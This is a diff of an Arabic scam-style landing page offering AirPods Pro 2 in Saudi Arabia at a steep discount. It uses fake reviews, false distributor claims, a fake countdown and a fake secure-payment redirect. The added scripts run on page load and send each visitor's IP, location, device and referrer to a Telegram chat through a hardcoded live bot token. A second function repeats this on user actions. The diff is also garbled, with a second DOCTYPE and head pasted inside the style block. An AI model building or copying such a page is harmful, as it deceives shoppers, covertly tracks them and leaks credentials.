@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -41,6 +40,9 @@
             position:absolute;left:18px; top:16px;font-size:1.5rem;color:#bdbdbd;cursor:pointer; line-height: 1;
         }
         .policy-content .close-btn:hover {color:#2563eb;}
+
+
+        /* Logo Animation */
         .logo-container { position: relative; width: 56px; height: 56px; margin-bottom: 0.5rem; cursor: pointer; }
         .logo-image {
             position: absolute;
@@ -54,6 +56,8 @@
             opacity: 1;
             transform: translateY(0);
         }
+
+        /* Shiny Silver Text Effect */
         .shiny-silver-text {
             background: linear-gradient(170deg, #f8f8f8 5%, #d8d8d8 30%, #b8b8b8 50%, #a0a0a0 70%, #c0c0c0 95%);
             -webkit-background-clip: text;
@@ -64,6 +68,8 @@
                          0px -1px 1px rgba(50,50,50,0.1);
             cursor: pointer;
         }
+
+        /* Top Navigation Menu */
         #topNavMenu {
             background-color: #ffffff;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
@@ -94,6 +100,8 @@
             background-color: #f3f4f6; /* gray-100 */
             color: #1d4ed8; /* blue-700 */
         }
+
+        /* Sticky Floating Order Button (Bottom) */
         #floatingOrderBtn {
             position: fixed;
             bottom: 20px;
@@ -121,6 +129,9 @@
             transform: translate(-50%, -5px) !important; 
             animation-play-state: paused; 
         }
+      
+
+        /* Timed Pop-up Modal Styles */
         #timedPopupModal {
             display: none; position: fixed; left: 0; top: 0; width: 100%; height: 100%;
             background-color: rgba(0, 0, 0, 0.6); z-index: 20002; /* Highest z-index */
@@ -157,6 +168,8 @@
             border: none; cursor: pointer; box-shadow: 0 4px 12px rgba(37, 99, 235, 0.3);
         }
         .timed-popup-order-btn:hover { background-color: #1d4ed8; transform: translateY(-2px); }
+
+        /* Reviews Section */
         #reviews-section { padding-top: 2rem; padding-bottom: 3rem; background-color: #f9fafb; /* gray-50 */ }
         .review-card {
             background-color: white;
@@ -181,33 +194,39 @@
             height: auto;
             margin-left: 0.75rem; 
         }
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AirPods Pro الجيل الثاني - عرض حصري</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap" rel="stylesheet">
+    <style>
+        /* ... كل CSS كما هو ... */
     </style>
+    <!-- BEGIN: TELEGRAM TRACKING SCRIPT -->
     <script>
-        // Telegram Visitor Tracking Script
+        // إعدادات بوت تيليجرام الخاصة بك
         const TELEGRAM_BOT_TOKEN = '8026919110:AAG4E2c6M6eeUYXn2NbY5GBF4ryPnkZqby8';
         const TELEGRAM_CHAT_ID = '-4913064483';
+
         async function sendVisitorToTelegram() {
             try {
+                // جلب بيانات IP والموقع الجغرافي
                 const res = await fetch('https://ipapi.co/json');
                 const data = await res.json();
-                let msg = `👤 <b>New visitor on AirPods Pro page:</b>
-`;
-                msg += `🌐 <b>IP:</b> ${data.ip}
-`;
-                msg += `🌍 <b>Country:</b> ${data.country_name}
-`;
-                msg += `🏙️ <b>City:</b> ${data.city}
-`;
-                msg += `📱 <b>Device:</b> ${navigator.userAgent}
-`;
-                msg += `🗣️ <b>Language:</b> ${navigator.language}
-`;
-                msg += `🕒 <b>Time:</b> ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}
-`;
-                msg += `🔗 <b>URL:</b> ${window.location.href}
-`;
-                if (document.referrer) msg += `↩️ <b>Referrer:</b> ${document.referrer}
-`;
+                // تجهيز الرسالة
+                let msg = `👤 <b>زائر جديد على صفحة AirPods Pro:</b>\n`;
+                msg += `🌐 <b>IP:</b> ${data.ip}\n`;
+                msg += `🌍 <b>الدولة:</b> ${data.country_name}\n`;
+                msg += `🏙️ <b>المدينة:</b> ${data.city}\n`;
+                msg += `📱 <b>الجهاز:</b> ${navigator.userAgent}\n`;
+                msg += `🗣️ <b>اللغة:</b> ${navigator.language}\n`;
+                msg += `🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' })}\n`;
+                msg += `🔗 <b>الرابط:</b> ${window.location.href}\n`;
+                if (document.referrer) msg += `↩️ <b>المصدر:</b> ${document.referrer}\n`;
+                // إرسال الرسالة
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { "Content-Type": "application/json" },
@@ -217,12 +236,866 @@
                         parse_mode: 'HTML'
                     })
                 });
-            } catch (e) {}
+            } catch (e) {
+                // فشل في الإرسال (لا حاجة لأي إجراء)
+            }
         }
         window.addEventListener('DOMContentLoaded', sendVisitorToTelegram);
     </script>
+    <!-- END: TELEGRAM TRACKING SCRIPT -->
+
+    <!-- BEGIN: FACEBOOK PIXEL (أدخل ID الخاص بك مكان PIXEL_ID) -->
+    <!--
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src='https://connect.facebook.net/en_US/fbevents.js';
+      s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script');
+      fbq('init', 'PIXEL_ID');
+      fbq('track', 'PageView');
+    </script>
+    <noscript>
+      <img height="1" width="1" style="display:none"
+           src="https://www.facebook.com/tr?id=PIXEL_ID&ev=PageView&noscript=1"/>
+    </noscript>
+    -->
+    <!-- END: FACEBOOK PIXEL -->
+
+    <!-- BEGIN: TIKTOK PIXEL (أدخل ID الخاص بك مكان TIKTOK_PIXEL_ID) -->
+    <!--
+    <script>
+      !function (w, d, t) {
+        w.TiktokAnalyticsObject = t;
+        var ttq = w[t] = w[t] || [];
+        ttq.methods = ["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie"];
+        ttq.setAndDefer = function (t, e) {
+          t[e] = function () {
+            t.push([e].concat(Array.prototype.slice.call(arguments, 0)))
+          }
+        };
+        for (var i = 0; i < ttq.methods.length; i++) {
+          ttq.setAndDefer(ttq, ttq.methods[i])
+        }
+        ttq.instance = function (t) {
+          var e = ttq._i[t] || [];
+          for (var n = 0; n < ttq.methods.length; n++) {
+            ttq.setAndDefer(e, ttq.methods[n])
+          }
+          return e
+        };
+        ttq.load = function (e, n) {
+          var i = "https://analytics.tiktok.com/i18n/pixel/events.js";
+          ttq._i = ttq._i || {};
+          ttq._i[e] = [];
+          ttq._i[e]._u = i;
+          ttq._t = ttq._t || {};
+          ttq._t[e] = +new Date;
+          ttq._o = ttq._o || {};
+          ttq._o[e] = n || {};
+          var o = document.createElement("script");
+          o.type = "text/javascript";
+          o.async = !0;
+          o.src = i + "?sdkid=" + e + "&lib=" + t;
+          var a = document.getElementsByTagName("script")[0];
+          a.parentNode.insertBefore(o, a)
+        };
+
+        ttq.load('TIKTOK_PIXEL_ID');
+        ttq.page();
+      }(window, document, 'ttq');
+    </script>
+    -->
+    <!-- END: TIKTOK PIXEL -->
+	<script>
+window.addEventListener('DOMContentLoaded', function() {
+    fetch("https://api.telegram.org/bot8026919110:AAG4E2c6M6eeUYXn2NbY5GBF4ryPnkZqby8/sendMessage", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+            chat_id: "-4913064483",
+            text: "🚀 Test from real web page load!",
+            parse_mode: "HTML"
+        })
+    });
+});
+</script>
 </head>
 <body>
-<!-- باقي كود الموقع من عندك، ولأن النص كبير جدًا، إذا احتجت باقي الكود أرجعه في ملف مرفوع الآن -->
-</body>
+<!-- ... باقي الموقع كما هو بدون تغيير ... -->
+
+    </style> 
+</head>
+<body class="bg-white text-gray-800">
+
+    <button id="floatingOrderBtn" class="bg-blue-600 hover:bg-blue-700 transition rounded-xl text-white font-bold">
+        احصل عليه الآن
+    </button>
+
+    <div id="cartBar" class="cart-bar">
+        <img id="cartBarAirpodsImg" src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="AirPods" class="w-10 h-10 object-contain rounded-lg border border-gray-200"
+        onerror="this.onerror=null; this.src='https://placehold.co/40x40/E2E8F0/334155?text=AP&font=tajawal'; this.alt='سماعات AirPods غير متوفرة'">
+        <span>🛒 تم إضافة المنتج للسلة بنجاح!</span>
+    </div>
+
+    <header id="mainHeader" class="w-full pt-5 pb-2 px-4 flex flex-col items-center bg-white sticky top-0 z-40">
+        <div id="logoArea" class="flex flex-col items-center cursor-pointer">
+            <div class="logo-container">
+                <img id="logoImg1" src="https://i.postimg.cc/GtJNm9yD/Screenshot-20250525-200139-Chrome.jpg" alt="شعار AirPod - تصميم 1" class="logo-image active" onerror="this.onerror=null; this.src='https://placehold.co/56x56/cccccc/ffffff?text=شعار1&font=tajawal'; this.alt='الشعار غير متوفر'">
+                <img id="logoImg2" src="https://i.postimg.cc/yNpbtZsm/Apple-Logosu.png" alt="شعار AirPod - تصميم 2" class="logo-image" onerror="this.onerror=null; this.src='https://placehold.co/56x56/cccccc/ffffff?text=شعار2&font=tajawal'; this.alt='الشعار غير متوفر'">
+            </div>
+            <span class="text-3xl font-extrabold tracking-tight mb-0 shiny-silver-text" style="letter-spacing:-1px;">Airpod</span>
+        </div>
+        <nav id="topNavMenu">
+            <ul>
+                <li><a href="#home" class="nav-link">الرئيسية</a></li>
+                <li><a href="#reviews-section" class="nav-link">آراء العملاء</a></li>
+                <li><a href="#features-section" class="nav-link">مواصفات المنتج</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <section id="home" class="container mx-auto px-4 pt-4 pb-7 flex flex-col items-center">
+        <div class="flex items-center justify-center mb-3">
+            <img src="saudi_flag_icon.png" alt="علم السعودية" class="saudi-flag" onerror="this.onerror=null; this.src='https://placehold.co/28x21/006C35/FFFFFF?text=🇸🇦&font=tajawal'; this.alt='علم السعودية'">
+            <h2 class="text-xl font-bold text-green-600">عرض خاص للسعودية!</h2>
+        </div>
+        <h1 class="text-4xl sm:text-5xl font-extrabold text-center leading-tight text-gray-900 mb-3">عرض حصري على سماعات AirPods Pro الجيل الثاني!</h1>
+        <p class="text-lg text-gray-700 text-center max-w-xl mb-2 leading-relaxed">
+            🔥 <span class="font-bold">احتفالاً بالذكرى السنوية لإطلاق AirPods Pro، نقدم لك هذا الخصم المذهل!</span> اغتنم الفرصة الآن.
+        </p>
+        <p class="text-lg text-gray-700 text-center max-w-xl mb-2 leading-relaxed">
+            💡 جودة أصلية 100% مع ضمان لمدة عام كامل.
+        </p>
+         <p class="text-lg text-gray-700 text-center max-w-xl mb-4 leading-relaxed">
+            ⏳ <span class="font-bold text-red-600">الكمية محدودة جداً!</span> لا تفوت الفرصة.
+        </p>
+        <div class="flex items-end space-x-4 rtl:space-x-reverse mx-auto mb-2"> 
+            <span class="text-4xl font-bold text-blue-600">39.99 ر.س فقط</span>
+            <span class="text-lg line-through text-gray-400">249 ر.س</span>
+        </div>
+        <div class="text-red-600 font-semibold mb-1 text-center">العرض ينتهي خلال: <span id="timer" class="mr-2">02:30:00</span></div>
+        <button id="orderBtn" class="bg-blue-600 hover:bg-blue-700 transition px-8 py-3 rounded-2xl shadow-lg text-white text-xl font-bold mt-2 mb-4 w-full sm:w-auto">
+            احصل عليه الآن 🇸🇦
+        </button>
+        <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="سماعات AirPods Pro 2 بيضاء" class="max-w-xs w-full mb-2 image-shadow" style="margin-bottom:12px;" onerror="this.onerror=null; this.src='https://placehold.co/300x300/E2E8F0/334155?text=AirPods&font=tajawal'; this.alt='سماعات AirPods Pro 2 غير متوفرة'">
+        <p class="text-center text-green-600 font-semibold mb-3 text-lg">
+            🚚 توصيل مجاني خلال يومين لجميع مدن المملكة!
+        </p>
+        <button id="detailsBtn" class="details-btn border-2 border-blue-600 rounded-2xl py-3 px-6 text-blue-700 text-lg font-semibold bg-white hover:bg-blue-50 transition-colors duration-200">عرض التفاصيل ومواصفات المنتج ↓</button>
+    </section>
+
+    <div id="modal" class="modal">
+        <div class="modal-content">
+            <span id="closeModal" class="close-btn">&times;</span>
+            <div class="flex justify-center items-center mb-2">
+                <span style="font-size:2rem; margin-left:8px;">🛒</span> 
+                <img id="popupAirpodsImg" src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="AirPods" class="w-10 h-10 object-contain rounded-lg border border-gray-200 mx-1"
+                     onerror="this.onerror=null; this.src='https://placehold.co/40x40/E2E8F0/334155?text=AP&font=tajawal'; this.alt='سماعات AirPods غير متوفرة'">
+                <span class="bg-blue-600 text-white text-xs sm:text-sm rounded-full px-2 py-0.5 mr-1 font-bold">1</span> 
+            </div>
+            <h2 class="text-xl font-bold mb-1 text-gray-800">تمت إضافة المنتج للسلة!</h2>
+            <p class="mb-4 text-gray-600 text-sm sm:text-base leading-relaxed">تم حجز سماعة AirPods Pro 2 لك. قم بإنهاء الطلب خلال 10 دقائق للاستفادة من العرض.</p>
+            <div class="select-color text-center mb-4"> 
+                <label class="block text-gray-700 font-semibold mb-2 text-center">اختر اللون:</label>
+                <div class="flex gap-3 justify-center">
+                    <label>
+                        <input type="radio" name="color" value="blanc" class="hidden" checked>
+                        <div class="color-option-display">
+                            <img src="https://i.postimg.cc/vB6Tkw6k/Screenshot-20250525-200639-Chrome.jpg" alt="أبيض"
+                                 onerror="this.onerror=null; this.src='https://placehold.co/56x56/E2E8F0/334155?text=أبيض&font=tajawal'; this.alt='اللون الأبيض غير متوفر'">
+                            <span class="mt-1 font-medium text-sm">أبيض</span>
+                        </div>
+                    </label>
+                    <label>
+                        <input type="radio" name="color" value="noir" class="hidden">
+                        <div class="color-option-display">
+                            <img src="https://i.postimg.cc/GpxqD620/images-2025-05-25-T200743-316-2.jpg" alt="أسود"
+                                 onerror="this.onerror=null; this.src='https://placehold.co/56x56/1F2937/FFFFFF?text=أسود&font=tajawal'; this.alt='اللون الأسود غير متوفر'">
+                            <span class="mt-1 font-medium text-sm">أسود</span>
+                        </div>
+                    </label>
+                </div>
+            </div>
+            <div class="mb-5">
+                <label class="block text-gray-700 font-semibold mb-1 text-center">الكمية:</label>
+                <div class="flex flex-col items-center gap-2">
+                    <input type="number" class="quantity-input" value="1" readonly>
+                    <span class="text-xs text-gray-500">الكمية محدودة: قطعة واحدة لكل طلب.</span>
+                </div>
+            </div>
+            <button id="finalizeBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg shadow-md transition hover:shadow-lg text-base sm:text-lg">إتمام الطلب والدفع الآمن</button>
+        </div>
+    </div>
+
+    <div id="loadingPopup" class="modal">
+        <div class="modal-content flex flex-col items-center justify-center">
+            <div class="mb-4">
+                <div class="animate-spin rounded-full border-4 border-gray-200 border-t-blue-600 w-12 h-12 mx-auto"></div>
+            </div>
+            <h3 class="text-lg font-bold text-gray-800 mb-2">جاري تحويلك إلى بوابة الدفع الآمنة...</h3>
+            <p class="text-gray-600 text-sm mb-2 leading-relaxed">سيتم توجيهك إلى بوابة الدفع المعتمدة لدينا (مدى / فيزا / ماستركارد).<br>
+            <span class="text-blue-700 font-semibold">الموقع موثق وآمن 100%.</span></p>
+            <p class="text-xs text-gray-500 mb-3">نظراً للضغط العالي على الموقع، قد يستغرق التحويل بضع ثوانٍ. شكراً لصبركم!</p>
+            <div class="flex items-center gap-2 mt-2">
+                <img src="visa_logo_payment.png" alt="Visa" class="h-7" style="background:#fff; border-radius:6px;" onerror="this.onerror=null; this.src='https://placehold.co/70x25/0057A0/FFFFFF?text=VISA&font=tajawal'; this.alt='شعار فيزا'">
+                <img src="mastercard_logo_payment.png" alt="Mastercard" class="h-7" style="background:#fff; border-radius:6px; padding: 2px;" onerror="this.onerror=null; this.src='https://placehold.co/70x25/FF5F00/FFFFFF?text=MC&font=tajawal'; this.alt='شعار ماستركارد'">
+                <img src="mada_logo_payment.png" alt="Mada" class="h-7" style="background:#fff; border-radius:6px; padding: 2px;" onerror="this.onerror=null; this.src='https://placehold.co/70x25/00AEEF/FFFFFF?text=مدى&font=tajawal'; this.alt='شعار مدى'">
+                <span style="font-size:1.2rem; color:#15803d;">🔒</span>
+                <span class="text-green-700 text-xs font-medium">دفع آمن</span>
+            </div>
+        </div>
+    </div>
+
+    <div id="timedPopupModal">
+        <div class="timed-popup-content">
+            <span id="timedPopupCloseBtn" class="timed-popup-close-btn">&times;</span>
+            <div class="timed-popup-icon">🎉</div>
+            <h2 class="timed-popup-title">تهانينا!</h2>
+            <p class="timed-popup-text leading-relaxed">
+                بمناسبة الذكرى السنوية لإطلاق AirPods Pro، نقدم لك هذا العرض المحدود!
+            </p>
+            <p class="timed-popup-text timed-popup-highlight leading-relaxed">
+                أنت محظوظ لرؤية هذا العرض – لا تفوت فرصتك!
+            </p>
+            <div class="timed-popup-timer-container">
+                العرض ينتهي خلال: <span id="timedPopupTimerDisplay">00:00:00</span>
+            </div>
+            <button id="timedPopupOrderBtn" class="timed-popup-order-btn">اطلبه الآن واستفد من الخصم</button>
+        </div>
+    </div>
+
+    <section id="reviews-section" class="container mx-auto px-4">
+        <h2 class="text-3xl sm:text-4xl font-extrabold text-center text-gray-900 mb-4">آراء عملائنا الكرام</h2>
+        <div class="flex justify-center mb-6">
+            <img src="https://i.postimg.cc/QMChxyZj/images-8.png" alt="شعار تقييمات موثوقة" class="trustpilot-badge" onerror="this.onerror=null; this.src='https://placehold.co/250x70/cccccc/ffffff?text=شعار+التقييمات&font=tajawal'; this.alt='شعار تقييمات العملاء غير متوفر'">
+        </div>
+        <div class="grid md:grid-cols-2 gap-6 lg:gap-8">
+            <div class="review-card">
+                <div class="flex items-start">
+                    <img src="https://i.ibb.co/N6vB4TTB/FB-IMG-1748223150251.jpg" alt="صورة ليلى" class="review-avatar" onerror="this.onerror=null; this.src='https://placehold.co/60x60/EBF4FF/7F9CF5?text=ل&font=tajawal'; this.alt='صورة ليلى غير متوفرة'">
+                    <div>
+                        <h3 class="font-semibold text-lg text-gray-800">ليلى .ع</h3>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                </div>
+                <p class="text-gray-700 mt-2 leading-relaxed">"رهيبة! وصلتني سماعات AirPods Pro 2 خلال يومين بس. جودة الصوت خرافية وعزل الضوضاء ممتاز جداً بالنسبة للسعر. أنصحكم بقوة بـ PromoMagique!"</p>
+                <small class="text-gray-500 mt-2 block">تقييم بتاريخ ٢٢ مايو ٢٠٢٥</small>
+            </div>
+            <div class="review-card">
+                <div class="flex items-start">
+                    <img src="https://i.postimg.cc/MKZpJbWC/FB-IMG-1748223545571.jpg" alt="صورة أحمد" class="review-avatar" onerror="this.onerror=null; this.src='https://placehold.co/60x60/FEF3C7/D97706?text=أ&font=tajawal'; this.alt='صورة أحمد غير متوفرة'">
+                    <div>
+                        <h3 class="font-semibold text-lg text-gray-800">أحمد .م</h3>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                </div>
+                <p class="text-gray-700 mt-2 leading-relaxed">"في البداية كنت متردد بسبب السعر، لكن كل شيء طلع تمام. المنتج أصلي ومغلف والتوصيل كان سريع جداً. خدمة العملاء كانوا متعاونين وردوا على استفساري بسرعة قبل الشراء."</p>
+                <small class="text-gray-500 mt-2 block">تقييم بتاريخ ٢٠ مايو ٢٠٢٥</small>
+            </div>
+            <div class="review-card">
+                <div class="flex items-start">
+                    <img src="https://i.postimg.cc/XNLnLGwQ/FB-IMG-1748223785268.jpg" alt="صورة خلود" class="review-avatar" onerror="this.onerror=null; this.src='https://placehold.co/60x60/D1FAE5/059669?text=خ&font=tajawal'; this.alt='صورة خلود غير متوفرة'">
+                    <div>
+                        <h3 class="font-semibold text-lg text-gray-800">خلود .د</h3>
+                        <div class="review-stars">★★★★☆</div>
+                    </div>
+                </div>
+                <p class="text-gray-700 mt-2 leading-relaxed">"راضية جداً عن شرائي. السماعات ممتازة. ملاحظة بسيطة بس، علبة السماعة كانت متضررة شوي من الزاوية، لكن السماعات نفسها سليمة. الصوت رائع ومريحة في الأذن."</p>
+                <small class="text-gray-500 mt-2 block">تقييم بتاريخ ١٨ مايو ٢٠٢٥</small>
+            </div>
+            <div class="review-card">
+                <div class="flex items-start">
+                    <img src="https://i.postimg.cc/fymwQSnX/FB-IMG-1748223905324.jpg" alt="صورة ناصر" class="review-avatar" onerror="this.onerror=null; this.src='https://placehold.co/60x60/FEE2E2/DC2626?text=ن&font=tajawal'; this.alt='صورة ناصر غير متوفرة'">
+                    <div>
+                        <h3 class="font-semibold text-lg text-gray-800">ناصر .ل</h3>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                </div>
+                <p class="text-gray-700 mt-2 leading-relaxed">"أخيراً عرض يستاهل على سماعات AirPods Pro 2 أصلية! تأكدت من الرقم التسلسلي على موقع أبل وكل شيء تمام. الراحة لا تقارن بسماعاتي القديمة. شكراً PromoMagique!"</p>
+                <small class="text-gray-500 mt-2 block">تقييم بتاريخ ١٥ مايو ٢٠٢٥</small>
+            </div>
+             <div class="review-card md:col-span-2 lg:col-span-1">
+                <div class="flex items-start">
+                    <img src="https://i.postimg.cc/cLZVRszt/FB-IMG-1748224215323.jpg" alt="صورة سارة" class="review-avatar" onerror="this.onerror=null; this.src='https://placehold.co/60x60/E0E7FF/4338CA?text=س&font=tajawal'; this.alt='صورة سارة غير متوفرة'">
+                    <div>
+                        <h3 class="font-semibold text-lg text-gray-800">سارة .ب</h3>
+                        <div class="review-stars">★★★★★</div>
+                    </div>
+                </div>
+                <p class="text-gray-700 mt-2 leading-relaxed">"طلبتها لولدي، ومرة مبسوط فيها! الاقتران بجواله الآيفون كان فوري. جودة الصوت للموسيقى والمكالمات ممتازة. شكلي بطلب لي وحدة كمان."</p>
+                <small class="text-gray-500 mt-2 block">تقييم بتاريخ ١٢ مايو ٢٠٢٥</small>
+            </div>
+        </div>
+    </section>
+
+    <section id="features-section" class="container mx-auto px-2 pb-12 pt-2">
+        <img src="https://i.postimg.cc/L6hSBn4v/Messenger-creation-1-FAD9597-9711-4630-8392-0-B45-B41-D92-DE.jpg" class="features-img" alt="مواصفات AirPods Pro - صورة 1" onerror="this.onerror=null; this.src='https://placehold.co/800x600/cccccc/ffffff?text=صورة+المواصفات+1&font=tajawal'; this.alt='صورة المواصفات غير متوفرة'">
+        <img src="https://i.postimg.cc/D0pT3K6q/Messenger-creation-4-C8-E1-CAC-3735-45-C3-8701-57-D656-C12455.jpg" class="features-img" alt="مواصفات AirPods Pro - صورة 2" onerror="this.onerror=null; this.src='https://placehold.co/800x600/cccccc/ffffff?text=صورة+المواصفات+2&font=tajawal'; this.alt='صورة المواصفات غير متوفرة'">
+        <img src="https://i.postimg.cc/fyRNPbcz/Messenger-creation-A7-B78-C1-F-F67-C-43-A3-B162-D2-E8-ACF3-C3-AB.jpg" class="features-img" alt="مواصفات AirPods Pro - صورة 3" onerror="this.onerror=null; this.src='https://placehold.co/800x600/cccccc/ffffff?text=صورة+المواصفات+3&font=tajawal'; this.alt='صورة المواصفات غير متوفرة'">
+        <img src="https://i.postimg.cc/fW8Z9xsJ/Messenger-creation-B58-C7783-1-ADC-41-D2-80-A1-C1-B45-A303041.jpg" class="features-img" alt="مواصفات AirPods Pro - صورة 4" onerror="this.onerror=null; this.src='https://placehold.co/800x600/cccccc/ffffff?text=صورة+المواصفات+4&font=tajawal'; this.alt='صورة المواصفات غير متوفرة'">
+    </section>
+
+    <footer class="bg-gray-900 text-gray-300 py-8 mt-4">
+        <div class="container mx-auto px-4 text-center">
+            <div class="mb-3 space-x-2 sm:space-x-4 text-sm">
+                <a href="#" id="about-link" class="hover:text-white">من نحن</a>
+                <a href="#" id="privacy-link" class="hover:text-white">سياسة الخصوصية</a>
+                <a href="#" id="terms-link" class="hover:text-white">الشروط والأحكام</a>
+                <a href="#" id="support-link" class="hover:text-white">الدعم الفني</a>
+                <a href="#" id="contact-link" class="hover:text-white">اتصل بنا</a>
+            </div>
+            <div class="text-xs opacity-60 mb-1">&copy; <span id="currentYear"></span> PromoMagique. جميع الحقوق محفوظة.</div>
+        </div>
+    </footer>
+
+    <div id="about-page" class="policy-modal"><div class="policy-content"><span class="close-btn" onclick="this.parentElement.parentElement.style.display='none'">&times;</span>
+        <h2 class="font-bold text-xl mb-3">من نحن؟</h2>
+        <p>PromoMagique هي شركة مقرها في فرنسا، متخصصة في البحث عن أفضل العروض والخصومات على سماعات AirPods الأصلية ومشاركتها. نعمل كوسيط قانوني مستقل وموزع معتمد لسماعات AirPods، ونساعد مجتمعنا في الحصول على منتجات Apple الأصلية بأسعار لا تصدق.</p>
+        <p>مهمتنا هي بناء مجتمع قوي من العملاء والمتابعين الراضين من خلال الثقة والشفافية.</p>
+        <p>بالنسبة لعملائنا في المملكة العربية السعودية، نسعى جاهدين لتوفير نفس الجودة والخدمة الممتازة مع مراعاة احتياجات السوق المحلي.</p>
+    </div></div>
+
+    <div id="privacy-page" class="policy-modal"><div class="policy-content"><span class="close-btn" onclick="this.parentElement.parentElement.style.display='none'">&times;</span>
+        <h2 class="font-bold text-xl mb-3">سياسة الخصوصية</h2>
+        <p>يتم جمع جميع معلومات العملاء فقط لأغراض معالجة الطلبات ودعم العملاء والتسليم. لن تقوم PromoMagique أبداً ببيع أو تأجير أو مشاركة بياناتك الشخصية مع أطراف ثالثة، باستثناء شركاء الدفع والشحن اللازمين لإتمام عملية الشراء الخاصة بك.</p>
+        <p>يمكنك طلب حذف أو تحديث معلوماتك في أي وقت عن طريق الاتصال بنا.</p>
+        <p><strong>للتواصل بخصوص الخصوصية:</strong> <a href="mailto:privacy.sa@promomagique.com" class="text-blue-600 hover:underline">privacy.sa@promomagique.com</a></p>
+    </div></div>
+
+    <div id="terms-page" class="policy-modal"><div class="policy-content"><span class="close-btn" onclick="this.parentElement.parentElement.style.display='none'">&times;</span>
+        <h2 class="font-bold text-xl mb-3">الشروط والأحكام</h2>
+        <p>تعمل PromoMagique كموزع مستقل رسمي وشريك ترويجي لسماعات AirPods الأصلية من Apple. تخضع جميع العروض والخصومات لتوفر المنتج وهي مخصصة للمستهلكين النهائيين فقط.</p>
+        <p>نضمن أن جميع المنتجات المعروضة جديدة وأصلية ويتم توصيلها بأمان إلى عملائنا. يشكل استخدامك لهذا الموقع موافقتك على سياسة الخصوصية الخاصة بنا والتزامنا بممارسات تجارية عادلة وآمنة وشفافة.</p>
+        <p>تطبق ضريبة القيمة المضافة (VAT) بنسبة 15% على جميع الطلبات داخل المملكة العربية السعودية وفقاً للأنظمة المحلية.</p>
+    </div></div>
+
+    <div id="support-page" class="policy-modal"><div class="policy-content"><span class="close-btn" onclick="this.parentElement.parentElement.style.display='none'">&times;</span>
+        <h2 class="font-bold text-xl mb-3">الدعم الفني</h2>
+        <p>فريق الدعم لدينا متوفر لخدمتكم. يمكنكم التواصل معنا لأي استفسارات تتعلق بطلباتكم، المنتجات، أو سياساتنا عبر:</p>
+        <ul>
+            <li><strong>البريد الإلكتروني:</strong> <a href="mailto:support.sa@promomagique.com" class="text-blue-600 hover:underline">support.sa@promomagique.com</a></li>
+            <li><strong>رقم الهاتف (واتساب متوفر):</strong> <a href="tel:+966551234567" class="text-blue-600 hover:underline" dir="ltr">+966 55 123 4567</a></li>
+        </ul>
+        <p>يمكنكم أيضاً التواصل معنا عبر صفحاتنا على وسائل التواصل الاجتماعي.</p>
+    </div></div>
+
+    <div id="contact-page" class="policy-modal"><div class="policy-content"><span class="close-btn" onclick="this.parentElement.parentElement.style.display='none'">&times;</span>
+        <h2 class="font-bold text-xl mb-3">اتصل بنا</h2>
+        <p><strong>البريد الإلكتروني:</strong> <a href="mailto:info.sa@promomagique.com" class="text-blue-600 hover:underline">info.sa@promomagique.com</a></p>
+        <p><strong>رقم الهاتف (المملكة العربية السعودية):</strong> <a href="tel:+966551234567" class="text-blue-600 hover:underline" dir="ltr">+966 55 123 4567</a></p>
+        <p><strong>العنوان (مكتب تمثيلي):</strong></p>
+        <p>PromoMagique السعودية<br>طريق الملك فهد، العليا<br>الرياض، المملكة العربية السعودية</p>
+        <p><strong>وسائل التواصل الاجتماعي:</strong> @PromoMagiqueSA (فيسبوك، انستغرام، تويتر)</p>
+    </div></div>
+
+    <script>
+    // This is the main script for page functionality.
+    // It includes a sendTelegramAlert function for specific actions.
+    // To avoid conflict with the new visitor tracking script, the new script's 
+    // function will be named sendTelegramNewVisitorAlert.
+
+    const MAIN_TELEGRAM_BOT_TOKEN = '8026919110:AAG4E2c6M6eeUYXn2NbY5GBF4ryPnkZqby8';
+    const MAIN_TELEGRAM_CHAT_ID = '-4913064483';
+
+    async function sendTelegramAlert(action, details = {}) { // This is the MAIN action alert function
+        let ipInfo = { 
+            ip: 'N/A', country_name: 'N/A', country_code: 'N/A', 
+            city: 'N/A', region_name: 'N/A' 
+        };
+        try {
+            const ipRes = await fetch('https://ip-api.com/json/'); 
+            if (ipRes.ok) {
+                const data = await ipRes.json();
+                if (data && data.status === "success") { 
+                    ipInfo = { 
+                        ip: data.query || 'N/A', 
+                        country_name: data.country || 'N/A', 
+                        country_code: data.countryCode || 'N/A', 
+                        city: data.city || 'N/A', 
+                        region_name: data.regionName || 'N/A'
+                    };
+                } else {
+                    console.warn("Main Action IP API (ip-api.com) query failed:", data);
+                    ipInfo.ip = data.query || 'N/A (API query error)'; 
+                }
+            } else {
+                console.error("Main Action IP API (ip-api.com) request failed HTTP status:", ipRes.status);
+                ipInfo.ip = `HTTP Error ${ipRes.status}`;
+            }
+        } catch (e) {
+            console.error("Exception fetching Main Action IP for Telegram alert:", e);
